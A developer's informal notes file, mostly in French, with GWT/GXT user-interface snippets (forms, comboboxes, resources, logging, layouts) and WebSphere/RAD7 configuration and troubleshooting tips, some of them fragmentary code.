                templateServiceImpl =
                                            @SuppressWarnings("serial")
                                            public class TemplateServiceImpl extends RemoteServiceServlet implements  TemplateService  
                pour appeler ce service du client:                                                    
                                          au niveau des champs de classe : 
                                                  private TemplateServiceAsync templateService = GWT.create(TemplateService.class);
                                          Dans une methode: 
                                            	    templateService.getTemplateList(new AsyncCallback<WEC51_M_TEMPLATE[]>() 
                                        	    		{
                                        	    			public void onFailure(Throwable caught) 
                                        	    			{
                                        	    					// Show the RPC error message to the user
                                        	    					MessageBox.alert("Result", "Failure"+ caught, null);
                                        	    			}
                                              			@Override
                                              			public void onSuccess(WEC51_M_TEMPLATE[] result) 
                                              			{
        			                                       ....
                                              			}
                                        	           });
            dans web.xml :-)
                                                  <servlet>
                                                    <servlet-name>templateServlet</servlet-name>
                                                    <servlet-class>com.renault.wec.server.TemplateServiceImpl</servlet-class>
                                                  </servlet>
                                                  <servlet-mapping>
                                                    <servlet-name>templateServlet</servlet-name>
                                                    <url-pattern>/wecapp/totototo</url-pattern>
                                                  </servlet-mapping>
                                                  
pour faire une popup avec joli message :
        MessageBox.alert("Result", "blah: " + fe.getResultHtml(), null);
      on peut aussi faire ca : mais c plus moche 
          Window.alert("Event Tab Was Selected");
    on peut faire aussi une progress bar avec : .progress(...)
pour modifier les styles d'un element: 
    monObjetGXT
pour faire un formulaire avec des champs:  Ne pas chercher à utiliser columnlayout (attention c'est galère de faire un formulaire sur plusieurs colonnes et meme de rajouter par exemple un widget à chaque field horizontallement: utiliser htmlContainer dans ce cas mais ca supprimer les fieldlabel ou bien en autre recourt si formulaire dynamique utiliser TableLayout) 
	 loginForm = new FormPanel();       
	     loginForm.setHeading(constants.connexion());  
	     loginForm.setFrame(true);  
	     loginForm.setWidth(350);
	     loginForm.setLabelWidth(300);  
	     loginForm.setAction(GWT.getModuleBaseURL()+"login"); // non je ne fais plus comme ca: voir le bouton "Submit plus bas"
	     // mais dans ce cas dans web.xml mettre: 
	                 <servlet-name>loginGXTManagerServlet</servlet-name>
                    <servlet-class>com.renault.wec.server.Login</servlet-class>
                  </servlet>
                  <servlet-mapping>
                    <servlet-name>loginGXTManagerServlet</servlet-name>
                    <url-pattern>/wecapp/login</url-pattern>
                  </servlet-mapping>
	     //loginForm.setEncoding(FormPanel.Encoding.MULTIPART);
	     //loginForm.setMethod(FormPanel.Method.GET); // marche pas en mode posts
	     loginForm.setMethod(FormPanel.Method.POST);
	     loginForm.addListener(Events.Submit,new Listener<FormEvent>(){ // non je ne fais plus comme ca voir le bouton "submit"
	    	 public void handleEvent(FormEvent fe){
	    		 
	    	 Log.debug(fe.getSource().toString());
	    	 MessageBox.alert("Result", "Check Forums on how to get an actual result: " + fe.getResultHtml(), null);
	    	 }
	    	 });
	     loginForm.addListener(Events.BeforeSubmit,new Listener<FormEvent>(){ // ne pas utiliser ca plutot voir la bouton "Submit" plus bas
	    	 public void handleEvent(FormEvent fe)
	    	 {
	    	 Log.debug(fe.getSource().toString());
	    	 }
	    	 });
	     FieldSet fieldSetLogin = new FieldSet(); // ne pas utiliser fieldSet mais le form direct. si on veut l'utiliser c mieux de mettre le form complet avec ses champs Dans le fieldset. mais pas les champs dans le fieldset.
	     fieldSetLogin.setHeading(constants.enterYourUserNameAndPassword());
	     TextField<String> firstName = new TextField<String>();  
	     firstName.setFieldLabel("Email"); // n'ecrira rien apres le rendered si n'est pas directement dans un formulaire  
	     firstName.setName("email");
	     firstName.setAllowBlank(false);  
	     firstName.getFocusSupport().setPreviousId(loginForm.getButtonBar().getId());  
	     fieldSetLogin.add(firstName);  
	   
	     TextField<String> email = new TextField<String>();  
	     email.setFieldLabel("Password"); // n'ecrira rien apres le rendered si n'est pas directement dans un formulaire
	     email.setName("password");
	     email.setAllowBlank(false);  
	     fieldSetLogin.add(email);
	     // pour faire un bouton parcourir....
	     FileUploadField file = new FileUploadField();  
	      file.setAllowBlank(false);  
	      file.setName("uploadedfile");  
	      file.setFieldLabel("File"); // n'ecrira rien apres le rendered si n'est pas directement dans un formulaire  
	      fieldSetLogin.add(file); 
	 	    loginForm.addListener(Events.BeforeSubmit,new Listener<FormEvent>(){ // ne pas faire ca: voir ce que je fais avec le bouton "Submit" ci dessous
	    	 public void handleEvent(FormEvent fe)
	    	 {
	    	 Log.debug(fe.getSource().toString());
	    	 }
	    	 });
	    	   
	    Button b = new Button("Submit", new SelectionListener<ButtonEvent>() 
	    {  
		       public void componentSelected(ButtonEvent ce) 
		       {
		    	   List<Field<?>> fieldListOfWecField = form.getFields();
						for (Field field :fieldListOfWecField)
						{
							Log.debug(field.getName());
							BaseModelData t = new BaseModelData();
							if (field.getValue()!=null && !field.getValue().equals("null")) t.set(field.getName(), field.getValue()); // t est un objet serialisable. Attention Field n'est pas serialisable donc il faut passer par cette ligne c oblige
						}
						if (fieldListOfWecField.get(0).getName().startsWith("WEC5"))
						{
  						WEC51_M_TEMPLATEServiceAsync fieldService = GWT.create(WEC51_M_TEMPLATEServiceAsync.class);
  						List<WEC51_M_TEMPLATE>  tlist = new ArrayList<WEC51_M_TEMPLATE>();
  						tlist.add(t);
                       fieldService.updateTemplateList(tlist,  new AsyncCallback<WEC51_M_TEMPLATE[]>()
                    		   { 
              	    			public void onFailure(Throwable caught) 
              	    			{
              	    					// Show the RPC error message to the user
              	    					MessageBox.alert("Result", "Failure"+ caught, null);
              	    			}
								@Override
								public void onSuccess(WEC51_M_TEMPLATE[] result) {
									wecApp.loadTemplateFormFieldFromTempalte((WEC51_M_TEMPLATE) wecApp.getTemplateModel());
									
								}
              	});
						}
					}

		       }  
	     		);
	    	 Bouton submit AVANT mais ci dessus c mieux: 
	 	   b.addListener(Events.OnClick, new Listener<ComponentEvent>() 
   				{
   					public void handleEvent(ComponentEvent be) 
   					{
   						Log.debug("submit0");
   						loginForm.submit();
   						
   					}
   				});
   				loginForm.addListener(Events.Submit,new Listener<FormEvent>(){
	    	 public void handleEvent(FormEvent fe){
	    		 
	    	 Log.debug(fe.getSource().toString());
	    	 MessageBox.alert("Result", "Check Forums on how to get an actual result: " + fe.getResultHtml(), null);
	    	 }
	    	 });
	 	       loginForm.addButton(b);  
	 	     Button cancel = new Button("Cancel", new SelectionListener<ButtonEvent>() {  
			       public void componentSelected(ButtonEvent ce) {
			    	   goameg.loadChooseContry();
			       }  
	 	     		});       
			       loginForm.addButton(cancel); 
	     loginForm.add(fieldSetLogin);
	     loginForm.add(fieldSetSubscribe);	 	


pour faire un select combobox dans un formulaire de type standard... c'est pas terrible mais j'ai pas trouve mieux.
  ListStore<BaseModel> options = new ListStore<BaseModel>();
	     BaseModel m1= new BaseModel();
	     m1.set("WEC52_OBLCLIEN","O");
	     BaseModel m2 = new BaseModel();
	     m2.set("WEC52_OBLCLIEN","N");
	     options.add(m1);
	     options.add(m2); // mes options sont des baseModels	     
	     final ComboBox<BaseModel> comboObligClien = new ComboBox<BaseModel>(); // voici mon select
         comboObligClien.setStore(options);  
         comboObligClien.setWidth(3);
         comboObligClien.setDisplayField(WEC52_M_CHAMPS.OBLCLIEN); // doit etre un de mes champs de mon model ici en l'occurence le BaseModel
         comboObligClien.setValueField(WEC52_M_CHAMPS.OBLCLIEN);   // doit etre un de mes champs de mon model ici en l'occurence le BaseModel
         comboObligClien.setTypeAhead(true);  
         comboObligClien.setFieldLabel("ObligClien <font class='yellow'>*</font>");
         comboObligClien.setName("WEC52_OBLCLIEN");
         comboObligClien.setTriggerAction(TriggerAction.ALL);
         BaseModel selected = new BaseModel();
         selected.set("WEC52_OBLCLIEN",wec52_M_CHAMPS.getWEC52_OBLCLIEN());
         comboObligClien.setValue(selected);
         ToolTipConfig config2 = new ToolTipConfig();
         config2.setMinWidth(300);
         config2.setTitle(TOOLTIPTITLE);
         config2.setText(TOOLTIPOBLCLIEN);                                      
         config2.setMouseOffset(new int[] {0, 0});  
         config2.setAnchor("left");
         config2.setDismissDelay(0);
         comboObligClien.setToolTip(config2);
         paramForm.add(comboObligClien);
    puis pour recuperer tous les champs de mon formulaire
              List<Field<?>> fieldListOfWecField = paramForm.getFields();
	    			    	   Log.debug(fieldListOfWecField.toString());
	      						for (Field field :fieldListOfWecField)
	      						{
      								Log.debug(field.getName()+"--"+field.getValue());
	      							if (field.getValue()!=null && !field.getValue().equals("null"))
	      							{
	      								try
	      								{
	      								f.set(field.getName(), field.getValue());
	      								}
	      								catch (ClassCastException cce) // besoin de faire ca car il va y avoir comme value de mon combobox des BaseModel et pas des strings
	      								{
	      									f.set(field.getName(),field.getRawValue());
	      								}

	      							}
	      						}

  pour faire un select avec de belles options:
              private native static String getUserTemplate(String base) /*-{
                	  return [
                	  			'<img src="../images/besoin.PNG"/>',
                	  			'<tpl for=".">',
                	  			'<p>',
                	          '<div class="x-combo-list-item">',
                		          '{#}.',
                		          '<tpl if="code == 1">',  // on peut mettre "<" ">" "==" etc
                		          	'<img src="../images/chargedon.PNG"/>',
                		          '</tpl>',
                		          '<tpl if="code == 2">',
                		          	'<img src="../images/chargepaye.PNG"/>',
                		          '</tpl>',
                		            '{type}',
                		            '</div>',
                	          '</p></tpl>'
                	         ].join("");
                	}-*/;
              mon combo: pour faire un select avec de jolis images
                                  (UserType est comme ca: public class UserType implements ModelData, Serializable) 
                                    UserType userTypeList1 =new UserType("Volontaire",1);
                             	     UserType userTypeList2 =new UserType("Benevole",2);
                                  	     ou
                           	      UserType userTypeList1 = new WEC72_M_CHMSCE();
                                  userTypeList1.setWEC72_OBLCLIEN("0");
                           	     ListStore<UserType> ls = new ListStore<UserType>();
                           	     ls.add(userTypeList1);
                           	     ls.add(userTypeList2);

        	     XTemplate tpl = XTemplate.create(getUserTemplate(""));
        	          ComboBox<UserType> combo2 = new ComboBox<UserType>(); // voici mon select
        	          combo2.setWidth(150);
        	          combo2.setEmptyText("select a user type...");
        	          combo2.setStore(ls);  
        	          combo2.setTemplate(tpl); // optionnel  
        	          combo2.setDisplayField("type"); // doit etre un de mes champs de mon model  
        	          combo2.setTypeAhead(true);  
        	          combo2.setTriggerAction(TriggerAction.ALL);  
        	          combo2.setFieldLabel("Company"); // n'ecrira rien apres le rendered si n'est pas directement dans un formulaire
        	           loginForm.add(combo2);
        	     Quand je change d'element d'option sur mon select et pour setter une option dans mon select.
        	     	          combo1.addSelectionChangedListener(new SelectionChangedListener<UserType>(){
                    				@Override
                    				public void selectionChanged(SelectionChangedEvent<UserType> se) {
                    					combo2.setStore(ls2); // remplir le select
                    					combo2.setValue(ls2.getAt(1)); // setter une option dans mon select sans faire appel a une base (par defaut quoi)
                    					ou 
                    					combo2.setValue(wec72_M_CHMSCE); // la je prend la donnee qui vient de la base: wec72_M_CHMSCE est un jdo dont le parametre "type" est sette 
                    				}

pour raffraichir un element meme si il a dejà ete rendered: 
    monElement.layout();
classe de resources:
            package com.application.yoani.client.resources;
                            public interface YoaniResources extends ClientBundle {
                            	  public static final YoaniResources INSTANCE =  GWT.create(YoaniResources.class);
                            	  
                            	  @NotStrict // mettre ca pour ne pas avoir de pb de type besoin de mettre @external obfuscated
                            	  @Source("com/application/yoani/client/resources/GrowingSchoolbag.css")
                            	  public Css cssGrowingSchoolbag();
                            
                            	  @NotStrict
                            	  @Source("com/application/yoani/client/resources/gxt-all.css")
                            	  public Css cssGWT();
                            
                            	  /*
                            pour les datas : ?
                            	  @Source("test.txt")
                            	  public DataResource test();
                            	  
                            pour des fichiers de type autre : 
                            	  @Source("manual.pdf")
                            	  public DataResource ownersManual();
                            	  
                            	  
                            pour les fichiers textes (pas bien compris... sinon voir plus bas):
                            		@Source("synchronous.txt") ou xml
                            			  TextResource synchronous();
                            			  VALABLE POUR TOUTES LES RESSOURCES!!  C genial:est compatible avec i18n: voici l'ordre de recherche si on est en francais
                            	    1.  synchronous_fr_FR.txt
                               		2. synchronous_fr.txt
                               		3. synchronous.txt
                            		//ailleurs : :
                            		//		 Using a TextResource
                            				myTextArea.setInnerText(Resources.INSTANCE.synchronous().getText());
                            		
                            			  @Source("b.txt")
                            			  ExternalTextResource asynchronous();
                            			}
                            		//ailleurs : Using an ExternalTextResource
                            		Resources.INSTANCE.asynchronous().getText(new ResourceCallback<TextResource>() {
                            		  public void onError(ResourceException e) { ... }
                            		  public void onSuccess(TextResource r) {
                            		    myTextArea.setInnerText(r.getText());
                            		  }
                            		});
                            pour les fichiers textes i18n:
                                  creer une interface: 
                                            public interface Labels extends com.google.gwt.i18n.client.Messages
                                            {
                                            	String connexion();
                                            	String enterYourUserNameAndPassword();
                                            }
                                    dans une autre classe: 
                                          Labels constants = (Labels)GWT.create(Labels.class);
                                          loginForm.setHeading(constants.connexion());
                                    et sous le repertoire client j'ai  
                                      	    1. Labels_fr_FR.txt
                                         		2. Labels_fr.txt
                                         		3. Labels.txt
                                    
                            
                            pour les images :
                            dans 
                            public interface YoaniResources extends ClientBundle {
	                               public static final YoaniResources INSTANCE =  GWT.create(YoaniResources.class);
                            		@Source("logo.png")                               (cette image est stockee sous monapp/client/resources)
                            		 @ImageOptions(flipRtl = true) // flip horizontally
                            		 @ImageOptions(flipRtl = repeatStyle) // repeter image
                                 @ImageOptions(width = 10) // taille de l'image (size)// attention non je pense que ca ne marche pas 
                            		  ImageResource logo();
                            		  ailleurs: 
                            		  Resources resources = GWT.create(Resources.class);
                            		Image img = new Image(resources.logo());
                            		ou si j'ai un bouton bt:
                                bt.setIcon(AbstractImagePrototype.create(resources.logo()));
                                  a savoir: 
                                      *  ImageBundle becomes ClientBundle
                                      * AbstractImageProtoype becomes ImageResource
                                      * AbstractImagePrototype.createImage() becomes new Image(imageResource)
                                      * Other methods on AbstractImagePrototype can continue to be used by calling AbstractImagePrototype.create(imageResource) to provide an API wrapper.
                            
                            pour recuperer dynamiquement une classe: ( je ne vois pas trop l'interet du truc)
                            				interface Resources extends ClientBundle {
                            				  Resources INSTANCE = GWT.create(Resources.class);
                            				
                            				  @ClassType(SomeClass.class)
                            				  GwtCreateResource<ReturnType> factory();
                            				}
                            				
                            				// Elsewhere
                            				ReturnType obj = Resources.INSTANCE.factory().create();
                            */
                            
                            
                            
                            }

pour builder en mode detailler mettre dans le build.xml :
                  <target name="gwtc" depends="cleansfe" description="GWT compile to JavaScript (production mode)">
                  (...)
           	<arg line="-style"/>
            <arg value="DETAILED"/> sinon ya OBF, PRETTY
pour i18n internationalisation locale:
    declarer dans le module: 
              <module>
                    <inherits name="com.google.gwt.i18n.I18N"/>
              </module>
pour faire un champ date 
      				  DateField field = new DateField();
							  DateTimePropertyEditor format = new DateTimePropertyEditor();
							  format.setFormat(DateTimeFormat.getFormat("dd/MM/yy"));
							  field.setPropertyEditor(format);
							  tf = field;  
     
/* pour logguer loguer logger loger (quand on l'installe necessaire de tout recompiler avec ant) alan sauer 
        installer gwt-log-3.1.0.jar etait avant gwt-log-3.0.4.jar et declarer 
        <inherits name="com.allen_sauer.gwt.log.gwt-log-DEBUG" />
       dans le fichier monfichier.gwt.xml */
       autres paramètrages possibles: 
                                <!-- For production most teams prefer to set the default log level to `OFF` -->
                              <inherits name="com.allen_sauer.gwt.log.gwt-log-OFF" />

                              <!-- For development a default of `DEBUG` is recommended -->
                              <inherits name="com.allen_sauer.gwt.log.gwt-log-DEBUG" />
                      
                              <!-- To compile at `DEBUG`, `WARN` and `OFF` log levels (at 3x compile time) -->
                              <inherits name="com.allen_sauer.gwt.log.gwt-log-OFF" />
                              <extend-property name="log_level" values="DEBUG,WARN"/>
                      
                              <!-- 
                                 Default `OFF` but allow selection of a specific log level, say `INFO`, via the `log_level` URL parameter, e.g.
                                   http[s]://hostame:port/path/to/your/module/Module.html?log_level=INFO
                              -->
                              <inherits name="com.allen_sauer.gwt.log.gwt-log-OFF" />
                              <extend-property name="log_level" values="INFO"/>
                      
                              <!-- 
                                 Compile both `DEBUG` and `ERROR` log level, with level selection via a `gwt:property` meta tag in your HTML file, e.g.
                                      <meta name="gwt:property" content="log_level=DEBUG">
                              -->
                              <inherits name="com.allen_sauer.gwt.log.gwt-log-ERROR" />
                              <extend-property name="log_level" values="DEBUG"/>
       dans les classes : 
        		Log.debug("Starting SFEGRID"); (// de com.allen_sauer.gwt.log.client.Log)
    si j'ai l'erreur :  Deferred binding failed for 'com.allen_sauer.gwt.log.client.LogMessageFormatter
          passer a java 1.6 et rebuilder avec le ant

// pour recuperer des objets javascripts de ma page html:
          dans ma jsp j'ai :
                    var parameters = {
                     jsonUrl: "/sfe/pagination",
                      toto: "/sfe/pagination"
                    };

			    Dictionary parameters = Dictionary.getDictionary("parameters");
			    ContentPanel panel = new ContentPanel();
			    panel.setSize(1, 1);
			    final SfeGrid module = new SfeGrid(parameters);
          ... puis 
          String jsonUrl = parameters.get("jsonUrl");
        		String sqlQuery = parameters.get("sqlQuery");
        		String columns = parameters.get("columns");
pour creer un bouton : 
			     // add buttons  
			     com.extjs.gxt.ui.client.widget.button.Button load = new com.extjs.gxt.ui.client.widget.button.Button("Clear State", new SelectionListener<ButtonEvent>() {  
			          @Override
             public void componentSelected(ButtonEvent ce) 
             {
              WEC52_M_CHAMPS f = (WEC52_M_CHAMPS)ce.getButton().getData("field");
			    	   module.getGrid().getState().clear();
			    	   module.getLoader().load();  
			       }
               @Override  
			       public void onFailure(Throwable caught) 
              {
              				MessageBox.alert("Result", "Failure"+ caught, null);
              }
              @Override
             public void onSuccess(WEC52_M_CHAMPS result) 
             {
              Widget f = (Widget)ce.getButton().getData("widgetField");
              if (result.getWEC52_FORMCLIEN().startsWith("ex"))
              {
                f.setStyleName("x-item-disabled");
              }
            }
			     });
           load.setData("field", result);     
utilisation d'un panel: 
      ContentPanel panel = new ContentPanel();
			    panel.setSize(1, 1);
			    final SfeGrid module = new SfeGrid(parameters);
			    panel.add(module.getToolBar());
			    panel.add(module.getGrid());
			    panel.setIcon((AbstractImagePrototype.create(YoaniResources.INSTANCE.logo())) ); // pour mettre une image en tete de mon panel a gauche du texte ci dessous
			    panel.setHeading(constants.subscribeAsStudent());// texte de l'entete de mon panel
			    panel.setAutoHeight(true);
			    panel.setHeaderVisible(false); // pour masquer l'entete
			    panel.setAutoWidth(true);
si j'ai un grid statefull 
    si j'ai des erreurs a cause du state le supprimer du browser (menu firefox)
    toujours faire un test après avoir supprime les cookies avant de livrer.
quand je recupere un parametre json toujours caster en string sinon ca freeze ou ne pas mettre trop de logs4j sinon jetty plante
      String filter = (String)request.getParameter("filters");
pour savoir si on a appuye sur la touche entree
    if (be.getKeyCode()== KeyboardEvents.Enter.getEventCode())
pour faire un ecouteur listener sur un objet avec gxt:
        TextField tf = new TextField();
        				tf.addListener(Events.OnKeyUp ou Events.Select, new Listener<FieldEvent ou ComponentEvent>()
        				{
        					public void handleEvent(FieldEvent ou ComponentEvent be) 
        					{
                      (...)        
        					}
        				});
pour faire plusieurs ecouteurs dont un lostfocus: 
						Listener<FieldEvent> listener = new Listener<FieldEvent>()
						{
					public void handleEvent(FieldEvent be) 
					{
						if (be.getEvent().getTypeInt()==Events.OnBlur.getEventCode() || be.getKeyCode()== KeyboardEvents.Enter.getEventCode())
						{
							(...)
						}
					}};
					field.addListener(Events.OnBlur,listener);
					field.addListener(Events.OnKeyUp,listener);
pour que quand on clique sur la ligne d'un tableau (row) on selectionne cette ligne par exemple grace a un ecouteur: 
          			     grid.addListener(Events.OnClick, new Listener<GridEvent>() 
    			    			{  
          			    	  public void handleEvent(GridEvent be) {
                        // attention!! ou qu'on clique sur le tableau il execute ca donc mettre une condition if comme si dessous sinon ya des exceptions lors du tri par exemple
                        if (be.getModel()!=null  && be.getColIndex()!=2)// (deuxieme option je l'ai mise pour un editorgrid pour ne pas qu'il declanche le listener sur la colonne 3!(starts with 0))
						    		    {  
    	       		            app.loadTemplateFormById(((WEC51_M_TEMPLATE)be.getModel()).getWEC51_ID());
    	       		        }
    			            }  
    			          }  
    			        );  

pour changer un ordre de tri dans un tableau :
      (dir est un string)
      Map<String, Object> state = grid.getState();
      state.put("sortDir", dir.equals("ASC")?SortDir.valueOf("DESC"):SortDir.valueOf("ASC"));
pour afficher un tableau comme on veut mais preferer htmlcontainer c'est super car on peut l'updated facilement apres rendrer car ya des class=. Ne pas chercher à utiliser columnlayout
   (creer un tableau ou on met tout ou rien)
          LayoutContainer container = new LayoutContainer();
          TableLayout tb = new TableLayout(3); //3 columns
         	 tb.setBorder(3); // mettre des bordures border
				 container.setLayout(tb);  
				 	     TableData columnSize = new TableData("20","20");      // pour forcer la taille des colonnes et lignes
				 container.add(lab, columnSize); // pour forcer la taille
				 container.add(new Label()); // blank cell
				 container.add(tf);
				 container.add(bt);
				 container.setSize(1,1);
				container.setAutoHeight(true); // usefull!!
				container.setAutoWidth(true);
				cc.setWidget(container,fieldId);
pour afficher ce quon veut ou on veut comme on veut quand on veut
attention , il vaut mieux en faire qu'un seul et ne pas en imbriquer plusieurs sinon ca casse tete. Les class= sont des id uniques
voici l'unite a TOUJOURS utiliser pour placer comme on veut les choses:
    <div style='position: relative; top: 0%; left: 380%; width: 10%;  height: 10%;'><table><tr><td class='centereastup'/></td></tr></table></div> 
          	  	 hc = new HtmlContainer("<div style='position: relative; top: 0%; left: 380%; width: 10%;  height: 10%;'><table><tr><td class='centereastup'/></td></tr></table></div>");
                	     hc.setBorders(true);
                	     hc.setSize(200, 100); // important!! toujours specifier
                	     hc.setPosition(10, 10);
                    	 Image img = new Image(YoaniResources.INSTANCE.logo());          		 
                		    hc.add(img, "td.north");                                   
                			   Label l = new Label(constants.welcome());
                		  	Label r1 = new Label(constants.purpose1());
                		  	r1.addStyleName("h2");
                		  	Label r2 = new Label(constants.purpose2());
                		  	hc.add(l, "td.west");
                		  	hc.add(r1, "td.east");
                		  	hc.add(r2, "td.east");
de la meme facon mais avec possibilite de faire des boucles sur des objets et de formater les donnees : utilisation de XTemplate:
                                  ModelData userTypeList =new UserType("a",1);
                                  	     XTemplate tpl = XTemplate.create(getUserTemplate(""));
                                  	     tpl.overwrite(someElement(du html), Util.getJsObject(userTypeList));
                                  	}
                                  	// utilisation des XTemplate
                                       private native static String getUserTemplate(String base) /*-{
                                  		  return ['<p>Name: {name}</p>',
                                  		          '<p>Kids: ',
                                  		          '<tpl for=".">',
                                  		          '<tpl if="code > 1">',
                                  		            '<p>{type}</p>',
                                  		          '</tpl>',
                                  		          '</tpl></p>'
                                  		         ].joint("");
                                  		);}-*/;
                                  		ailleurs:
                                  		public UserType(String type, int code) {
                                      //	        setType(type);
                                      //	        setCode(code);
                                      			set("type",type);
                                      			set("code",code);
                                      	        set("value",code); // tres important pour....
                                      	      }
                                      //	String getType()
                                      //	{
                                      //		return get("type");
                                      //	}
                                      //
                                      //	int getCode()
                                      //	{
                                      //		return get("code");
                                      //	}
                                      //	void setType(String type)
                                      //	{
                                      //		set("type",type);
                                      //	}
                                      //	void setCode(int code)
                                      //	{
                                      //		set("code",code);
                                      //	}
                                      
                                      }
                                    	
                                  	
afficher une boite de dialogue popup au milieu
        private final Dialog complex = new Dialog();
        complex.setBodyBorder(false);  
        complex.setHeading("Choose a date");  
        complex.setWidth(400);  
        complex.setHeight(225);  
        complex.setHideOnButtonClick(true);
        complex.getButtonById("ok").addListener(Events.OnClick, new Listener<ComponentEvent>() 
   				{
   					public void handleEvent(ComponentEvent be) 
   					{
   						Log.debug("submit0");
   						
   					}
   				});
   		
pour mettre une image a un bouton
        avec les resources : (et mettre aussi du texte: a gauche et image a droite) (marche mieux que les solutions avec css plus bas)
                ImageResource img = YoaniResources.INSTANCE.logo();
        			   france.setIcon(AbstractImagePrototype.create(img));
						    	france.setIconAlign(IconAlign.RIGHT);
            	    // pour resizer l'image: utiliser ImageOptions (voir dans ce fichier)?? ca n'a pas l'air de marcher.. il faut resizer l'image directement. j'ai tout essaye pas tout cherche)
	  	            bt.setHeight(15);
	  	            bt.setWidth(helpImg.getWidth());
						  	 france.setText("France");
						  	 france.setHeight(imgfr.getHeight());
						      france.setWidth(imgfr.getWidth()+50);
						  	 france.setStyleName("x-btn");
						  	 ou dans le css:
                 .x-btn button{
                        font: bold 11px tahoma,arial,helvetica,sans-serif;
                        color:#333;
                      	text-align: left; ca c'est important
                    } 
                avec les css: 
                final Button bt = new Button();
          			bt.setIcon(IconHelper.createStyle("add"));
          			(dans le css ya ca qui s'apelle MyWebApp.css et qui est declare dans index.html
                .add {
                    	background: url(/images/icones/add.PNG) no-repeat center center !important; // ATTENTION AU CHEMIN RELATIF! j'ai reessaye avec une autre image mais elle n'est pas complette...???. // voir LINKfontaw
                    	ou
                    	background: url(../images/icones/add.PNG);// ATTENTION AU CHEMIN RELATIF! voir LINKfontaw
                    	l'image se place ou elle peut a gauche d'un eventuel texte sete avec setText()
                  }
                  )
-----------------
requisite pro :
les projets sont sur: 
\\GEXOPE\Gestion_Exigences (nouveau!)
ou
\\F-Horus\shared\P-ODP\odp\RS3_Minute\REQUISITE\DOA_12760
ou  \\Cq566aos.sax.renault.fr\gestion_exigences\RS3_MINUTE\PTL_51363 
ou  \\Cq566aos.sax.renault.fr\gestion_exigences\I02_DOCUMENTATION_NOMENCLATURE
Si je n'arrive pas à y acceder : essayer d'acceder à \\Cq566aos.sax.renault.fr\gestion_exigences\RS3_MINUTE\ dans explorateur
puis essayer de connecter un nouveau lecteur reseau sur \\Cq566aos.sax.renault.fr\gestion_exigences\RS3_MINUTE\ 


versions websphere :
		application.xml:
					pour rad 7 version 6:
							<?xml version="1.0" encoding="UTF-8"?>
							<application id="Application_ID" version="1.4" xmlns="http://java.sun.com/xml/ns/j2ee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/application_1_4.xsd">
							<display-name>doa</display-name>
					pour was5:
						<?xml version="1.0" encoding="UTF-8"?>
						<!DOCTYPE application PUBLIC "-//Sun Microsystems, Inc.//DTD J2EE Application 1.3//EN" "http://java.sun.com/dtd/application_1_3.dtd">
						<application id="Application_ID">
						<display-name>doa</display-name>

RAD7 :
si j'ai l'erreur sql.SQLException: java.lang.IllegalAccessError: com/mysql/jdbc/ConnectionImpl.getInstance(Ljava/lang/String;ILjava/util/Properties;Ljava/lang/String;Ljava/lang/String;)Lcom/mysql/jdbc/Connection; :
      quand je veux parametrer une base mysql: 
        utiliser le driver mysql-connector-java-5.0.7 au lieu de mysql-connector-java-5.1.10
les jsp compilees sont sous: 
          C:\Program Files\IBM\SDP70\runtimes\base_v61\profiles\AppSrv06\temp\FR20095063Node01\server1\
          ou
          C:\Program Files\eclipseWASCE\servers\server1\repository\renault
definir variable serveur JVM :
    Serveurs d'applications > server1 > Definition des processus > Machine virtuelle Java >...
    ou dans le fichier
    C:\Program Files\IBM\SDP70\runtimes\base_v61\profiles\AppSrv06\config\cells\FR20095063Node01Cell\nodes\FR20095063Node01\servers\server1\server.xml
pour externaliser externalisation le fichier arca-config.xml: 
        Serveurs d'applications > server1 > Definition des processus > Machine virtuelle Java >...
        definir la variable arca.configuration vers un repertoire externe.
Pour externaliser les autres fichiers du classpath grace à fws: ( par exemple log4j)
       utiliser les variable APP_PATH_CONFIG dans web.xml
      APP_PATH_LOG c'est le repertoire ou vont etre ecrit les logs
pour externaliser externalisation d'autres fichiers de conf: 
      les parametrer comme variable de la jvm du serveur (arguments vm) // dans eclipse c'est dans Run >onglet environment
          -DSYE.confpath=D:\workspaceCESVN21\syeConf\conf (mettre les -D avant le -jar)
      puis dans le code: 
      public class LabelManager // par exemple 
      {
        private Properties props = new Properties();
        public PropertiesManager() {
    		Properties properties = System.getProperties();// recupère prop de la jvm voir LINKù*ù
    		confPath = properties.get("sye.confpath").toString();
		    String propertiesFile = confPath + Constants.SEPARATOR_SLASH + fileName;
        		    FileInputStream inputStream;
        		try {
        			inputStream = new FileInputStream(propertiesFile);
        			props = new Properties();
        			
        			if (null == inputStream ) {
        				logger.error("Unable to load " +propertiesFile);
        			} else {
        				props.load(inputStream);
        				found = true;
        			}
        		} catch (FileNotFoundException e2) {
        			logger.error(propertiesFile + " could not be found " + Utils.getStringStackTrace(e2));
        		} catch (IOException e1) {
        			logger.error("Error while opening " + propertiesFile + Utils.getStringStackTrace(e1));
        		}
        		
	}
si probleme: le serveur se lance mais sur le browser quand on saisi l'adresse de l'appli rien ne se passe:
          Le problème de la page blance est resolu. C'etait du à un Listener declare dans le web.xml (pour tracer les ouvertures et fermetures de session)
          le fait de tracer des logs (log4j) dans la methode "sessionCreated(HttpSessionEvent)" de cette classe Listener entraine la page blanche.
si j'ai l'erreur R 93 [Thread-101] ERROR action.ActionServlet  - Parsing error processing resource path 
    il faut modifier le fichier D:\workspaceRAD7PRojectsSVN\dwiWeb\.settings\org.eclipse.wst.common.component et remplacer
            <wb-resource deploy-path="/WEB-INF/classes" source-path="/JavaSource"/>
            par 
            <wb-resource deploy-path="/WEB-INF/classes" source-path="/src"/> qui est le bon path. 
pour forcer la publication d'une appli qui a quand meme des erreurs: 
		aller dans le menu preferences d'eclipse
Si j'ai l'erreur:
Servlet InvokerServlet is currently unavailable: SRVE0203E: Le servlet [InvokerServlet] : com.ibm.servlet.engine.webapp.InvokerServlet a ?t? trouv? mais il manque une autre classe requise.
SRVE0206E: Cette erreur implique g?n?ralement que le servlet a ?t? tout d'abord compil? avec des classes qui ne peuvent pas ?tre localis?es par le serveur.
				C'est parce que sur was5 on utilise la classe InvokerServlet qui sur was6 est automatiquement utilisee donc on a pas besoin de la declarer dans web.xml: il faut commenter dans web.xml la declaration de la servlet InvokerServlet et le mapping de InvokerServlet
si j'ai l'erreur: 
		A file does not exist for module element having uri Exception thrown in RequiredModelMBean while trying to invoke operation getApplicationInfo
